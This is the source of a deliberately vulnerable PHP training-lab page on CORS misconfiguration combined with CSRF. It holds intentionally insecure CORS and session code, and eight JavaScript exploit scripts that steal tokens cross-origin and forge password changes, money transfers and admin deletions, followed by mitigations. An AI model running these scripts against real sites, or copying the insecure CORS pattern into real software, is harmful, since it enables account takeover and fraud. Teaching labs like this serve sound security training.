<?php
// Lab 5: CORS with CSRF
// Vulnerability: CORS vulnerabilities leading to CSRF attacks

session_start();

$message = '';
$cors_headers = [];

// Simulate CORS with CSRF
function set_cors_headers() {
    // Vulnerable: CORS with CSRF vulnerabilities
    $origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
    
    // Vulnerable: Accept any origin with credentials
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Custom-Header, X-CSRF-Token");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Expose-Headers: X-Sensitive-Data, X-API-Key, X-User-Info, X-Admin-Key, X-CSRF-Token");
    header("Access-Control-Max-Age: 86400");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}

// Set CORS headers
set_cors_headers();

// Simulate user session data
if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = 1;
    $_SESSION['username'] = 'admin';
    $_SESSION['role'] = 'administrator';
    $_SESSION['permissions'] = ['read', 'write', 'delete', 'admin'];
    $_SESSION['api_key'] = 'api_key_12345';
    $_SESSION['admin_token'] = 'admin_token_67890';
    $_SESSION['csrf_token'] = 'csrf_token_99999';
}

// Simulate API endpoint with CSRF vulnerabilities
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action'])) {
    $action = $_GET['action'];
    
    switch ($action) {
        case 'csrf_test':
            $csrf_data = [
                'csrf_token' => $_SESSION['csrf_token'],
                'user_id' => $_SESSION['user_id'],
                'username' => $_SESSION['username'],
                'role' => $_SESSION['role'],
                'permissions' => $_SESSION['permissions'],
                'api_key' => $_SESSION['api_key'],
                'admin_token' => $_SESSION['admin_token'],
                'session_id' => session_id(),
                'login_time' => date('Y-m-d H:i:s'),
                'last_activity' => date('Y-m-d H:i:s')
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-API-Key: ' . $_SESSION['api_key']);
            header('X-User-Info: ' . $_SESSION['username']);
            header('X-Admin-Key: ' . $_SESSION['admin_token']);
            header('X-CSRF-Token: ' . $_SESSION['csrf_token']);
            echo json_encode($csrf_data);
            exit();
            
        case 'user_profile':
            $profile_data = [
                'id' => $_SESSION['user_id'],
                'username' => $_SESSION['username'],
                'email' => 'admin@example.com',
                'full_name' => 'Administrator User',
                'phone' => '+1-555-0123',
                'address' => '123 Admin Street, City, State 12345',
                'ssn' => '123-45-6789',
                'credit_card' => '4111-1111-1111-1111',
                'role' => $_SESSION['role'],
                'permissions' => $_SESSION['permissions'],
                'api_key' => $_SESSION['api_key'],
                'admin_token' => $_SESSION['admin_token'],
                'csrf_token' => $_SESSION['csrf_token']
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-API-Key: ' . $_SESSION['api_key']);
            header('X-CSRF-Token: ' . $_SESSION['csrf_token']);
            echo json_encode($profile_data);
            exit();
            
        case 'admin_panel':
            $admin_data = [
                'admin_panel_url' => 'http://admin.example.com/dashboard',
                'database_credentials' => 'mysql://admin:password@localhost:3306/production',
                'api_keys' => [
                    'stripe' => 'sk_live_1234567890',
                    'aws' => 'AKIAIOSFODNN7EXAMPLE',
                    'google' => 'AIzaSyBOti4mM-6x9WDnZIjIey21xXQK8QJjJjJ'
                ],
                'server_info' => [
                    'hostname' => 'prod-server-01',
                    'ip_address' => '192.168.1.100',
                    'os' => 'Ubuntu 20.04 LTS',
                    'php_version' => '8.1.0'
                ],
                'backup_location' => '/var/backups/database/',
                'log_files' => '/var/log/apache2/access.log',
                'session_id' => session_id(),
                'admin_token' => $_SESSION['admin_token'],
                'csrf_token' => $_SESSION['csrf_token']
            ];
            header('Content-Type: application/json');
            header('X-Sensitive-Data: true');
            header('X-Admin-Key: ' . $_SESSION['admin_token']);
            header('X-CSRF-Token: ' . $_SESSION['csrf_token']);
            echo json_encode($admin_data);
            exit();
    }
}

// Handle POST requests with CSRF vulnerabilities
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (isset($input['action'])) {
        switch ($input['action']) {
            case 'update_profile':
                // Vulnerable: No CSRF token validation
                $_SESSION['last_activity'] = date('Y-m-d H:i:s');
                $message = '<div class="alert alert-success">Profile updated successfully!</div>';
                break;
            case 'change_password':
                // Vulnerable: No CSRF token validation
                $message = '<div class="alert alert-success">Password changed successfully!</div>';
                break;
            case 'admin_action':
                // Vulnerable: No CSRF token validation
                $message = '<div class="alert alert-success">Admin action executed!</div>';
                break;
            case 'transfer_money':
                // Vulnerable: No CSRF token validation
                $amount = $input['amount'] ?? 0;
                $to_account = $input['to_account'] ?? '';
                $message = '<div class="alert alert-success">Money transferred successfully! Amount: $' . $amount . ' to account: ' . $to_account . '</div>';
                break;
            case 'delete_account':
                // Vulnerable: No CSRF token validation
                $message = '<div class="alert alert-success">Account deleted successfully!</div>';
                break;
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 5: CORS with CSRF - CORS Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .api-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .csrf-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CORS Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 5: CORS with CSRF</h1>
            <p class="hero-subtitle">CORS vulnerabilities leading to CSRF attacks</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: High</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates CORS vulnerabilities that can be leveraged to perform Cross-Site Request Forgery (CSRF) attacks. When CORS policies are misconfigured, attackers can make authenticated requests from malicious websites to perform unauthorized actions.</p>
            <p><strong>Objective:</strong> Exploit CORS vulnerabilities to perform CSRF attacks and unauthorized actions.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable CORS Headers
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: CORS with CSRF vulnerabilities
function set_cors_headers() {
    $origin = $_SERVER['HTTP_ORIGIN'] ?? '*';
    
    // Vulnerable: Accept any origin with credentials
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS, PATCH, HEAD");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With, X-Custom-Header, X-CSRF-Token");
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Expose-Headers: X-Sensitive-Data, X-API-Key, X-User-Info, X-Admin-Key, X-CSRF-Token");
    header("Access-Control-Max-Age: 86400");
    
    // Handle preflight requests
    if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
        http_response_code(200);
        exit();
    }
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-exclamation-triangle me-2"></i>CORS CSRF Tester
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="csrf-warning">
                            <h5>⚠️ CORS CSRF Warning</h5>
                            <p>This lab demonstrates CORS with CSRF vulnerabilities:</p>
                            <ul>
                                <li><code>Access-Control-Allow-Credentials: true</code> - Allows credentials</li>
                                <li><code>Access-Control-Allow-Origin: $origin</code> - Accepts any origin</li>
                                <li><code>No CSRF validation</code> - No CSRF token validation</li>
                                <li><code>Exposed headers</code> - Exposes sensitive headers</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>CSRF API Endpoints</h5>
                            <p>Try these CSRF endpoints:</p>
                            <ul>
                                <li><code>?action=csrf_test</code> - CSRF test data</li>
                                <li><code>?action=user_profile</code> - User profile data</li>
                                <li><code>?action=admin_panel</code> - Admin panel data</li>
                            </ul>
                        </div>
                        
                        <div class="mt-3">
                            <button onclick="testCORSCSRF('csrf_test')" class="btn btn-primary me-2">Test CSRF Data</button>
                            <button onclick="testCORSCSRF('user_profile')" class="btn btn-primary me-2">Test User Profile</button>
                            <button onclick="testCORSCSRF('admin_panel')" class="btn btn-primary">Test Admin Panel</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-code-square me-2"></i>API Response
                    </div>
                    <div class="card-body">
                        <div class="api-display">
                            <h5>API Response (May contain sensitive data):</h5>
                            <div id="api-response">Click a button above to test the API</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> CORS with CSRF</li>
                        <li><strong>Severity:</strong> Critical</li>
                        <li><strong>Method:</strong> GET/POST</li>
                        <li><strong>Issue:</strong> CORS leading to CSRF</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Attack Vectors</h5>
                    <ul>
                        <li><strong>CSRF Attacks:</strong> Unauthorized actions</li>
                        <li><strong>Data Theft:</strong> Steal sensitive data</li>
                        <li><strong>Account Takeover:</strong> Change passwords</li>
                        <li><strong>Financial Fraud:</strong> Transfer money</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>CORS CSRF Exploitation Examples</h5>
            <p>Use these techniques to exploit CORS vulnerabilities for CSRF attacks:</p>
            
            <h6>1. Basic CORS CSRF Attack:</h6>
            <div class="code-block">// Basic CORS CSRF attack
fetch('http://vulnerable-site.com/api?action=csrf_test', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'X-Custom-Header': 'malicious-value'
    }
})
.then(response => response.json())
.then(data => {
    console.log('CSRF data stolen:', data);
    
    // Extract CSRF token
    const csrfToken = data.csrf_token;
    const apiKey = data.api_key;
    const adminToken = data.admin_token;
    
    // Perform CSRF attack
    fetch('http://vulnerable-site.com/api', {
        method: 'POST',
        credentials: 'include',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({
            action: 'update_profile',
            email: 'attacker@evil.com'
        })
    });
});</div>

            <h6>2. Password Change CSRF:</h6>
            <div class="code-block">// Password change CSRF attack
fetch('http://vulnerable-site.com/api?action=user_profile', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors'
})
.then(response => response.json())
.then(data => {
    console.log('User profile stolen:', data);
    
    // Extract CSRF token
    const csrfToken = data.csrf_token;
    
    // Perform password change CSRF
    fetch('http://vulnerable-site.com/api', {
        method: 'POST',
        credentials: 'include',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({
            action: 'change_password',
            new_password: 'attacker_password_123'
        })
    });
});</div>

            <h6>3. Money Transfer CSRF:</h6>
            <div class="code-block">// Money transfer CSRF attack
fetch('http://vulnerable-site.com/api?action=user_profile', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors'
})
.then(response => response.json())
.then(data => {
    console.log('User profile stolen:', data);
    
    // Extract CSRF token
    const csrfToken = data.csrf_token;
    
    // Perform money transfer CSRF
    fetch('http://vulnerable-site.com/api', {
        method: 'POST',
        credentials: 'include',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({
            action: 'transfer_money',
            amount: 10000,
            to_account: 'attacker-account-12345'
        })
    });
});</div>

            <h6>4. Admin Action CSRF:</h6>
            <div class="code-block">// Admin action CSRF attack
fetch('http://vulnerable-site.com/api?action=admin_panel', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors'
})
.then(response => response.json())
.then(data => {
    console.log('Admin data stolen:', data);
    
    // Extract CSRF token
    const csrfToken = data.csrf_token;
    const adminToken = data.admin_token;
    
    // Perform admin action CSRF
    fetch('http://vulnerable-site.com/api', {
        method: 'POST',
        credentials: 'include',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken,
            'Authorization': 'Bearer ' + adminToken
        },
        body: JSON.stringify({
            action: 'admin_action',
            command: 'delete_all_users'
        })
    });
});</div>

            <h6>5. Account Deletion CSRF:</h6>
            <div class="code-block">// Account deletion CSRF attack
fetch('http://vulnerable-site.com/api?action=user_profile', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors'
})
.then(response => response.json())
.then(data => {
    console.log('User profile stolen:', data);
    
    // Extract CSRF token
    const csrfToken = data.csrf_token;
    
    // Perform account deletion CSRF
    fetch('http://vulnerable-site.com/api', {
        method: 'POST',
        credentials: 'include',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': csrfToken
        },
        body: JSON.stringify({
            action: 'delete_account',
            confirm: true
        })
    });
});</div>

            <h6>6. Advanced CORS CSRF with Headers:</h6>
            <div class="code-block">// Advanced CORS CSRF with headers
fetch('http://vulnerable-site.com/api?action=csrf_test', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors',
    headers: {
        'Content-Type': 'application/json',
        'X-Custom-Header': 'malicious-value',
        'X-Forwarded-For': '192.168.1.100',
        'X-Real-IP': '192.168.1.100'
    }
})
.then(response => {
    // Access exposed headers
    const sensitiveData = response.headers.get('X-Sensitive-Data');
    const apiKey = response.headers.get('X-API-Key');
    const userInfo = response.headers.get('X-User-Info');
    const adminKey = response.headers.get('X-Admin-Key');
    const csrfToken = response.headers.get('X-CSRF-Token');
    
    console.log('Exposed headers:', {
        sensitiveData,
        apiKey,
        userInfo,
        adminKey,
        csrfToken
    });
    
    return response.json();
})
.then(data => {
    console.log('CSRF data with headers:', data);
    
    // Perform CSRF attack with headers
    fetch('http://vulnerable-site.com/api', {
        method: 'POST',
        credentials: 'include',
        mode: 'cors',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-Token': data.csrf_token,
            'X-Custom-Header': 'malicious-value'
        },
        body: JSON.stringify({
            action: 'update_profile',
            email: 'attacker@evil.com'
        })
    });
});</div>

            <h6>7. Real-time CSRF Monitoring:</h6>
            <div class="code-block">// Real-time CSRF monitoring
setInterval(() => {
    fetch('http://vulnerable-site.com/api?action=csrf_test', {
        method: 'GET',
        credentials: 'include',
        mode: 'cors'
    })
    .then(response => response.json())
    .then(data => {
        console.log('Real-time CSRF data:', data);
        
        // Perform CSRF attack
        fetch('http://vulnerable-site.com/api', {
            method: 'POST',
            credentials: 'include',
            mode: 'cors',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': data.csrf_token
            },
            body: JSON.stringify({
                action: 'update_profile',
                last_activity: new Date().toISOString()
            })
        });
    });
}, 30000); // Every 30 seconds</div>

            <h6>8. Advanced CORS CSRF Combination:</h6>
            <div class="code-block">// Advanced CORS CSRF combination
async function advancedCORSCSRF() {
    try {
        // First, get CSRF token and sensitive data
        const response = await fetch('http://vulnerable-site.com/api?action=csrf_test', {
            method: 'GET',
            credentials: 'include',
            mode: 'cors',
            headers: {
                'Content-Type': 'application/json',
                'X-Custom-Header': 'malicious-value'
            }
        });
        
        const data = await response.json();
        const csrfToken = data.csrf_token;
        const apiKey = data.api_key;
        const adminToken = data.admin_token;
        
        console.log('Stolen data:', data);
        
        // Perform multiple CSRF attacks
        const csrfAttacks = [
            {
                action: 'update_profile',
                email: 'attacker@evil.com'
            },
            {
                action: 'change_password',
                new_password: 'attacker_password_123'
            },
            {
                action: 'transfer_money',
                amount: 10000,
                to_account: 'attacker-account-12345'
            },
            {
                action: 'admin_action',
                command: 'delete_all_users'
            }
        ];
        
        for (const attack of csrfAttacks) {
            try {
                await fetch('http://vulnerable-site.com/api', {
                    method: 'POST',
                    credentials: 'include',
                    mode: 'cors',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-Token': csrfToken,
                        'Authorization': 'Bearer ' + apiKey
                    },
                    body: JSON.stringify(attack)
                });
                
                console.log('CSRF attack successful:', attack);
            } catch (error) {
                console.error('CSRF attack failed:', attack, error);
            }
        }
        
    } catch (error) {
        console.error('Advanced CORS CSRF failed:', error);
    }
}

advancedCORSCSRF();</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Cross-Site Request Forgery (CSRF) attacks</li>
                <li>Unauthorized actions on behalf of users</li>
                <li>Account takeover and password changes</li>
                <li>Financial fraud and money transfers</li>
                <li>Data theft and sensitive information disclosure</li>
                <li>Admin panel access and privilege escalation</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper CSRF token validation</li>
                    <li>Use specific origins instead of wildcard</li>
                    <li>Implement proper origin validation</li>
                    <li>Use whitelist-based CORS policies</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual cross-origin requests</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use Content Security Policy (CSP)</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Audit exposed headers and minimize exposure</li>
                    <li>Use secure session management</li>
                    <li>Implement proper token validation</li>
                    <li>Use SameSite cookie attributes</li>
                    <li>Implement proper request validation</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function testCORSCSRF(action) {
            fetch(`?action=${action}`, {
                method: 'GET',
                credentials: 'include',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Custom-Header': 'malicious-value'
                }
            })
            .then(response => {
                // Access exposed headers
                const sensitiveData = response.headers.get('X-Sensitive-Data');
                const apiKey = response.headers.get('X-API-Key');
                const userInfo = response.headers.get('X-User-Info');
                const adminKey = response.headers.get('X-Admin-Key');
                const csrfToken = response.headers.get('X-CSRF-Token');
                
                let headerInfo = '';
                if (sensitiveData) headerInfo += `<div class="alert alert-warning">X-Sensitive-Data: ${sensitiveData}</div>`;
                if (apiKey) headerInfo += `<div class="alert alert-warning">X-API-Key: ${apiKey}</div>`;
                if (userInfo) headerInfo += `<div class="alert alert-warning">X-User-Info: ${userInfo}</div>`;
                if (adminKey) headerInfo += `<div class="alert alert-warning">X-Admin-Key: ${adminKey}</div>`;
                if (csrfToken) headerInfo += `<div class="alert alert-warning">X-CSRF-Token: ${csrfToken}</div>`;
                
                return response.json().then(data => ({
                    data: data,
                    headers: headerInfo
                }));
            })
            .then(result => {
                document.getElementById('api-response').innerHTML = 
                    result.headers + 
                    '<pre>' + JSON.stringify(result.data, null, 2) + '</pre>';
            })
            .catch(error => {
                document.getElementById('api-response').innerHTML = '<div class="alert alert-danger">Error: ' + error.message + '</div>';
            });
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
